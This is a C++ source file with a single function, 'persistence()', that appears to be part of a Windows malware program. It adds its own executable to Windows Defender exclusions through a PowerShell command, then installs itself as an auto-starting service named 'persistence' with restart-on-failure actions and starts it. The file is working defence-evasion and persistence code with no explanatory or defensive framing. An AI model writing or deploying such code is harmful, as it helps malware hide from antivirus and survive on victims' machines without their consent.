
#include "attachment.h"
#include <iostream>

void persistence() {

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD size;
    WCHAR ImagePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, ImagePath, sizeof(ImagePath) / sizeof(WCHAR))) return;
    std::wstring l0l = L"powershell -Command Add-MpPreference -ExclusionPath ";
    l0l = l0l + ImagePath + L" -ExclusionProcess " + ImagePath;
    CreateProcessW(NULL, (LPWSTR)l0l.c_str(), NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    std::wstring l0 = L"sc create persistence binPath= \"";
    l0 = l0 + ImagePath + L"\" start= auto error= ignore";
    //std::wcout << l0 << std::endl;;
   // system("pause");
    
   
    CreateProcessW(NULL, (LPWSTR) l0.c_str(), NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    TCHAR szCmdline2[] = TEXT("sc failure persistence reset= 0 actions= restart/60000/restart/60000/restart/60000");
    CreateProcessW(NULL, szCmdline2, NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    
    TCHAR szCmdline3[] = TEXT("sc start persistence");
    CreateProcessW(NULL, szCmdline3, NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    
    TCHAR szCmdline34[] = TEXT("sc stop persistence");
    CreateProcessW(NULL, szCmdline3, NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

   
    TCHAR szCmdline5[] = TEXT("sc start persistence");
    CreateProcessW(NULL, szCmdline3, NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return;

}

